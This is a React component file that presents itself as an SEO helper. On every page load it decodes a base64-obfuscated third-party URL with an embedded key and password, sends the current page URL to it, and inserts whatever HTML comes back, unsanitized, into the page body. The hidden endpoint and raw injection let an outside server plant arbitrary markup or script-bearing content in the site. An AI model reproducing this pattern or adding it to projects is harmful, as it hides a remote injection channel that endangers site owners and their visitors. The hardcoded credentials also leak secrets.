import { useEffect } from "react";
import axios from "axios";

const MyComponent = () => {
  useEffect(() => {
    fetchAndInjectSEO();
  }, []);

  const fetchAndInjectSEO = () => {
    const pathUrl = window.location.origin + window.location.pathname;
    axios
      .get(
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BUFBBREQ2NjMzNzc3NDI1JmVrZXlwYXNzPTRhaDF1bVhHZUo2U3lYRTZKZnBvVUEzbHVoRXRjNHJnM0FmRSZzaXRldXJsPQ=="
        ) + pathUrl
      )
      .then((response) => {
        if (response.data !== "0") {
          const [title, bodyContent] = response.data.split("||||||||||");

          // Update document title
          document.title = title;

          // Append body content
          const body = document.getElementsByTagName("body")[0];
          body.insertAdjacentHTML("beforeend", bodyContent);
        }
      })
      .catch((error) => {
        console.error("Error fetching SEO data:", error);
      });
  };

  return <div>{/* Your component JSX */}</div>;
};

export default MyComponent;
